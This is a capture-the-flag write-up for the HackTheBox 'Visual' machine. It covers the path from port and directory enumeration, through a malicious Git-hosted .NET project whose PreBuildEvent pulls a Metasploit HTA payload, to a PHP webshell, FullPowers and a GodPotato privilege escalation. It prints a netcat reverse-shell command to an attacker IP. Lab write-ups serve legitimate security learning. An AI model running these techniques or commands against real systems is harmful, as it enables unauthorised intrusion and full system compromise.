![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2cb269d8-b8b3-4f97-9e0a-d4f03720ed70)
https://app.hackthebox.com/machines/Visual

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began my enumeration by conducting a quick Rustscan on the target box to identify open ports and services. Regrettably, the scan revealed only one open port, which was running an Apache HTTP server on port 80. Here's the command I used for the scan:

```bash
sudo rustscan -a 10.10.11.234 -- -sC -sV -vv -oN visual_nmap
```
The Rustscan results provided the following information:

```Rust
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds
```
As I delved deeper, I explored the website associated with this open port. It became evident that the webpage was designed to accept a GitHub repository link, retrieve the .sln file from a C# project, and compile it for users:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/176a7e29-300e-4bc4-b825-878584f41788)

Continuing my investigation, I decided to use Gobuster to search for subdirectories. Although I uncovered a few directories, none of them seemed to offer a promising initial access vector. Here's the Gobuster command I used:

```bash
gobuster dir -u http://10.10.11.234/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -o visual_web -x php,txt -e -b 404,403,400 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4fc23b35-7797-4e97-b98f-7ea738ce6c8d)

Continuing my investigation, I started my web server and inserted my local IP into the GitHub URL link to check for a response:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/26e38cbe-6e09-459d-a269-897f20927069)

Based on the response I received, it appeared that the application was searching for a valid Git repository link:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e5324ae5-90e8-4770-aa1a-0c2639462e65)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Creation .NET project & git repo:

To proceed, we needed to create a temporary .NET project containing a .SLN file that the target application would fetch. The process to create the temporary .NET project was as follows:

First, we created a new .SLN file named "virtual" with the following command:

```bash
dotnet new sln -n virtual
```

Then, we added a new console application named "virtual" within the project using:

```bash
dotnet new console -n virtual
```
We included the newly created virtual.csproj into the solution "virtual" with:

```bash
dotnet sln add virtual/virtual.csproj
```

To initiate version control for the project, we initialized a Git repository:

```bash
git init
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/94f05b06-7c84-4235-be04-58c8af0ccf00)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f77a18f0-c5bf-4159-ab3a-558ad1533be7)


With the project and Git repository in place, we committed the changes by following these steps:

Added all changes to the Git staging area with the command:

```bash
git add .
```

Commited the changes with a descriptive message:

```bash
git commit -m "add"
```

We navigated to the .git directory to execute the following command, which updates the Git server information:

```bash
cd .git
git --bare update-server-info
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e6f5dfa0-84ca-40ef-82d6-6ff5feb5dca0)

Following these steps, we relaunched the HTTP server and provided the Git URL to the target application:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/55de984b-d9f9-447b-b7f6-7e32c9faa0b4)

This time, the target application did not display any errors while fetching the files from our Git repository:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/49624887-4511-446a-8aa4-d5e1a3bc2b53)

Although the build process failed, it confirmed that the build operation was running in the background:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a89eeabf-256f-4341-a4a5-0cd175de7876)

To address this, we created a file with a "[PreBuildEvent](https://learn.microsoft.com/en-us/cpp/build/how-to-use-build-events-in-msbuild-projects?view=msvc-170&source=post_page-----be0130b1c2df--------------------------------)" function, which performs execution before the build begins. We edited the content of the .csproj file to include "PreBuildEvent." The modified .csproj file looked something like this:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/46d389e7-ea67-47d8-b7f2-e1e33164f186)

After completing these steps, we initiated another Git commit and pasted our Git commit link. This action fetched the HTA payload and executed it in the PreBuild event, eventually providing us with a reverse shell in Metasploit.

Additionally, we started the Metasploit HTA web delivery server, which would deliver the payload:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dc3bb4ee-49c9-4b1c-942b-7396e0f73c7c)


After upgrading the shell, we finally gained access as the user "VISUAL\enox" and acquired the user flag. (pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d449dcfa-e05e-4588-8c3d-8b3731d587eb)


-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

Now that I had user access, it was essential to move laterally and elevate my privileges to gain access to the root flag. To facilitate this, I uploaded the WinPEAS binary and initiated a comprehensive scan for potential privilege escalation vectors:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a35e5958-2869-4aee-aa7d-c8ea73e59d2f)

WinPEAS revealed that, as the user "enox," I possessed write access to the "C:\xampp" folder:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e18e2099-3287-44b2-9273-f8e7bbdf370d)

With write access to the "xampp\htdocs" folder, I had the freedom to upload any content and access it via the website. I decided to upload a PHP [webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php), using the webshell for this purpose:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e858f05d-419e-4672-8f62-21a283d9a56f)

After successfully uploading the PHP webshell, I accessed it via the website, enabling me to execute commands within the shell:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/aa6fb531-8cfc-491d-ac6f-4134956f20e5)

It came to my attention that the webshell was running as "nt authority\local service":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a81ff13c-7574-42b6-bf13-61c2d3936cdc)

Further research and references led me to a remarkable [tool](https://github.com/itm4n/FullPowers?source=post_page-----be0130b1c2df--------------------------------), as described in an insightful [blog](https://itm4n.github.io/localservice-privileges/?source=post_page-----be0130b1c2df--------------------------------). The blog explained:

```
On Windows, some services executed as LOCAL SERVICE or NETWORK SERVICE are configured to run with a restricted set of privileges. Therefore, even if the service is compromised, you won't get the golden impersonation privileges and privilege escalation to LOCAL SYSTEM should be more complicated. However, I found that, when you create a scheduled task, the new process created by the Task Scheduler Service has all the default privileges of the associated user account (except SeImpersonate). Therefore, with some token manipulations, you can spawn a new process with all the missing privileges.
```

Once I executed "fullpower.exe" on the target host, my privileges as the local service account were elevated, as evidenced in the screenshot below:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/37f70118-ac44-4cbc-90da-efbd03815728)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Root.txt

Upon achieving the "SeImpersonatePrivilege" and "SeAssignPrimaryTokenPrivilege," I decided to upload a Windows netcat binary and utilize the [potato exploit](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer?source=post_page-----be0130b1c2df--------------------------------) to attain system-level privileges.

In this scenario, I opted for the [God Potato exploit](https://github.com/BeichenDream/GodPotato/releases) to establish a reverse shell on my Kali host, using a netcat listener. I initiated the netcat listener and executed God Potato to run netcat with system-level privileges:

```powershell
GodPotato-NET4.exe -cmd "C:\Users\Public\Temp\nc.exe 10.10.14.109 13337 -e cmd"
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9406b909-4455-491e-b1fe-05b283dc9a19)

As a result, I received a reverse shell as NT Authority\System:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7dc06dbd-5187-4f60-8f88-c5053636227c)

Using this system shell, I was able to access the root flag as well. (pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0809a746-c5cb-4561-b2ad-4baf513c8cdf)


